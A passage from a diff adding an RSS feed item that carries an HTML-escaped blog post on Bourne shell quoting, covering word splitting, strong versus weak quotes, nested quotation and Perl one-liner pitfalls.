+does not indicate a variable? Answer: the dollar sign must be
+&lt;strong&gt;quoted&lt;/strong&gt;. Why? &lt;strong&gt;Quoted characters do not have a special meaning.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Quoted characters do not have a special meaning.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A surprising number of characters have special meanings. The lowly
+space, often forgotten in many books, is an extremely important
+meta-character. Consider the following&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;rm -i file1 file2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The shell breaks this line up to four words, which can be logically
+divided into two classes.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;rm&lt;/code&gt; is program to execute&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-i&lt;/code&gt;, &lt;code&gt;file1&lt;/code&gt;, &lt;code&gt;file2&lt;/code&gt; are parameters or arguments, which will be
+passed to &lt;code&gt;rm&lt;/code&gt; before it runs.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;To shell, there is no difference between &lt;code&gt;-i&lt;/code&gt; and &lt;code&gt;file1&lt;/code&gt;, except that
+it follows convention that options begin with a hyphen, like &lt;code&gt;-i&lt;/code&gt;. All
+shell cares is to extract four words from the line, then find the
+executable &lt;code&gt;rm&lt;/code&gt; and pass the other three parameters to it. However, when
+you input the quoted version, it will be another story&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;rm -i &#39;file1 file2&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Note that, &amp;ldquo;quoted characters do not have a special meaning&amp;rdquo; , so does
+the space between &amp;lsquo;file1&amp;rsquo; and &amp;lsquo;file2&amp;rsquo;. DO NOT perceive &amp;lsquo;file1 file2&amp;rsquo; as
+a string in C or any other programming languages. &lt;strong&gt;There is no concept
+of C-like string in shell&lt;/strong&gt; and don&amp;rsquo;t even try to make the metaphor,
+which is often overlooked by beginners yet extremely important to keep
+in mind, in order to understand quotation correctly.&lt;/p&gt;
+
+&lt;p&gt;A more accurate description of the quoting is a &lt;strong&gt;switch&lt;/strong&gt;, or toggle &amp;ndash;
+it turns on and off the quotation status whether the meta-characters
+within text are getting to be interpreted. Therefore, following
+variations are all equivalent&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;rm &#39;file1 file2&#39;
+rm file1&#39; &#39;file2
+rm f&#39;ile1 file&#39;2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just remember: There is NO concept of string in shell at all.&lt;/p&gt;
+
+&lt;h2 id=&#34;strong-versus-weak-quoting:306ff65f81e8cfdac085c6fa77a5f38f&#34;&gt;Strong versus weak quoting&lt;/h2&gt;
+
+&lt;p&gt;Simple enough,&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt; is weakest: backslash(&lt;code&gt;\&lt;/code&gt;), dollar sign(&lt;code&gt;$&lt;/code&gt;), and the
+back-stick(``) all keep effective inside the double quotation.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;&lt;/code&gt; is strongest: single quotation returns everything inside the
+quotation literally.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;nested-quotation:306ff65f81e8cfdac085c6fa77a5f38f&#34;&gt;Nested quotation&lt;/h2&gt;
+
+&lt;p&gt;Once you have fully understood that The quotation marks in the Bourne
+shell are not used to define a string, but to &lt;strong&gt;disable&lt;/strong&gt; or &lt;strong&gt;enable&lt;/strong&gt;
+interpretation of meta-characters, it&amp;rsquo;s easy and intuitive to play with
+so called &amp;lsquo;nested quotation&amp;rsquo;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ echo &#39;Strong quotes use &#39;&amp;quot;&#39;&amp;quot;&#39; and weak quotes use &amp;quot;&#39;
+Strong quotes use &#39; and weak quotes use &amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Above example tells all story about nested quotation. Equivalently&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ echo &#39;&amp;quot;&#39;&amp;quot;&#39;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;simply gives &lt;code&gt;&amp;quot;&#39;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;some-tricky-cases:306ff65f81e8cfdac085c6fa77a5f38f&#34;&gt;some tricky cases&lt;/h2&gt;
+
+&lt;p&gt;There are always chances for you to use nested quotation in composing a
+program. What makes it tricky is that the order of quotation matters,
+let&amp;rsquo;s look at something live&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$perl -e &amp;quot;print(&#39;hello world&#39;)&amp;quot;
+hello world$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Printing hello world as we excepted, but Where is the \$ from? No magic,
+it is the beginning of the next line, because the absence of
+&lt;code&gt;line switch&lt;/code&gt; at the tail of &amp;lsquo;hello world&amp;rsquo;. You might think following is
+fine&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$perl -e &amp;quot;print(&#39;hello world\n&#39;)&amp;quot;
+hello world\n$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But it isn&amp;rsquo;t. Single quotation scapes &amp;lsquo;n&amp;rsquo; as Perl string syntax
+specified (NOTE, n is an escape chatachter defined by programing
+language, which has nothing to do with quotation in shell). In this
+cases, following is the way to set it right&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$perl -e &#39;print(&amp;quot;hello world\n&amp;quot;)&#39;
+hello world
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Another question worthy of thinking is, will
+&lt;code&gt;perl -e print(&amp;quot;hello world\n&amp;quot;)&lt;/code&gt; works? Now that &lt;code&gt;&#39;a&#39;&lt;/code&gt; has no difference
+with &lt;code&gt;a&lt;/code&gt; to shell, why &lt;code&gt;&#39;print(&amp;quot;hello world\n&amp;quot;)&#39;&lt;/code&gt; works while
+&lt;code&gt;print(&amp;quot;hello world\n&amp;quot;)&lt;/code&gt; doesn&amp;rsquo;t? Here is the result&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$perl -e print(&amp;quot;hello world\n&amp;quot;)
+Unknown file attribute.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;what-s-next:306ff65f81e8cfdac085c6fa77a5f38f&#34;&gt;What&amp;rsquo;s next&lt;/h2&gt;
+
+&lt;p&gt;I&amp;rsquo;m planning to write something about &lt;strong&gt;escape character versus
+quotation&lt;/strong&gt; later.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
